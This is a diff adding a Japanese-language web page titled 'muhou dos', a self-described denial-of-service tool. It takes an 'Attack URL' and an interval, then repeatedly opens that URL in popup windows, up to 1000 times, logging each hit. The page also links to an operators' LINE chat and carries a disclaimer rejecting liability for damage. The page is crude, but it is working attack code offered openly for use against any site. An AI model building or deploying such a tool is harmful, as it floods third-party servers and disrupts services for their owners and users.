@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <title>muhou dos</title>
+  <style>
+    body {
+      background-color: #0d0f0a;
+      color: #a0ff70;
+      font-family: 'Courier New', Courier, monospace;
+      padding: 20px;
+    }
+    h2 {
+      text-shadow: 0 0 8px #39ff14;
+    }
+    label, input, button {
+      font-family: monospace;
+      font-weight: bold;
+    }
+    input[type="text"], input[type="number"] {
+      background-color: #111a0b;
+      border: 1px solid #39ff14;
+      color: #a0ff70;
+      padding: 5px 8px;
+      width: 300px;
+      margin-top: 4px;
+      margin-bottom: 12px;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+    input[type="text"]:focus, input[type="number"]:focus {
+      border-color: #7fff00;
+      box-shadow: 0 0 8px #39ff14;
+    }
+    button {
+      background-color: #223311;
+      border: 1px solid #39ff14;
+      color: #a0ff70;
+      padding: 8px 16px;
+      margin-right: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s, color 0.3s;
+    }
+    button:hover:not(:disabled) {
+      background-color: #39ff14;
+      color: #0d0f0a;
+      box-shadow: 0 0 10px #39ff14;
+    }
+    button:disabled {
+      color: #555a44;
+      border-color: #555a44;
+      cursor: not-allowed;
+      background-color: #111a0b;
+      box-shadow: none;
+    }
+    #output {
+      margin-top: 20px;
+      background-color: #0f140a;
+      border: 2px solid #39ff14;
+      padding: 15px;
+      height: 250px;
+      overflow-y: auto;
+      white-space: pre-line;
+      box-shadow: 0 0 20px #39ff14 inset;
+      border-radius: 6px;
+      font-size: 14px;
+      line-height: 1.4em;
+    }
+    #openchatBtn {
+      display: inline-block;
+      background-color: #00c300;
+      color: white;
+      font-weight: bold;
+      padding: 12px 24px;
+      border-radius: 8px;
+      text-decoration: none;
+      font-family: monospace;
+      box-shadow: 0 0 8px #00ff00;
+      transition: background-color 0.3s;
+      margin-top: 30px;
+    }
+    #openchatBtn:hover {
+      background-color: #00ff00;
+      color: #0d0f0a;
+    }
+  </style>
+</head>
+<body>
+  <h2>muhou dos</h2>
+  <form id="attackForm">
+    <label for="attackURL">Attack URL：</label><br />
+    <input type="text" id="attackURL" autocomplete="off" /><br />
+    <label for="interval">Interval（ms）：</label><br />
+    <input type="number" id="interval" value="1000" min="100" /><br />
+    <button type="submit">表示</button>
+  </form>
+
+  <div style="margin-top: 15px;">
+    <button id="startBtn" disabled>実行開始</button>
+    <button id="stopBtn" disabled>停止</button>
+  </div>
+
+  <div id="output" spellcheck="false"></div>
+
+  <a id="openchatBtn" href="https://line.me/ti/g2/bPfiOwGTYvpGVRRQJYmI08Jj8_Q2WFhRyJLAhw?utm_source=invitation&utm_medium=link_copy&utm_campaign=default" target="_blank" rel="noopener noreferrer">
+    運営オープンチャットに参加
+  </a>
+  <h2>このサイトでの損害は私たちに責任はありません。使用時点でこの規約に同意されているものとみなします。</h2>
+
+  <script>
+    let attackURL = '';
+    let interval = 1000;
+    let timerId = null;
+    let count = 0;
+
+    const output = document.getElementById('output');
+    const startBtn = document.getElementById('startBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const form = document.getElementById('attackForm');
+
+    function log(msg) {
+      output.innerText += msg + "\n";
+      output.scrollTop = output.scrollHeight;
+    }
+
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      attackURL = document.getElementById('attackURL').value.trim();
+      interval = parseInt(document.getElementById('interval').value, 10);
+      if (!attackURL) {
+        alert('Attack URLを入力してください');
+        return;
+      }
+
+      output.innerText = '';
+      log(`AttackURL：${attackURL}`);
+      log(`Attack Interval：${(interval / 1000).toFixed(2)} 秒`);
+      startBtn.disabled = false;
+      stopBtn.disabled = true;
+    });
+
+    startBtn.addEventListener('click', () => {
+      if (timerId !== null) return;
+      count = 0;
+      log('実行開始しました。');
+      timerId = setInterval(() => {
+        count++;
+        window.open(attackURL, '_blank', 'width=400,height=300');
+        log(`(${count}) ウィンドウを開きました`);
+        if (count >= 1000) {
+          stop();
+          log('1000回実行して自動停止しました。');
+        }
+      }, interval);
+      startBtn.disabled = true;
+      stopBtn.disabled = false;
+    });
+
+    stopBtn.addEventListener('click', () => {
+      stop();
+      log('手動で停止しました。');
+    });
+
+    function stop() {
+      if (timerId !== null) {
+        clearInterval(timerId);
+        timerId = null;
+      }
+      startBtn.disabled = false;
+      stopBtn.disabled = true;
+    }
+  </script>
+</body>
+</html>
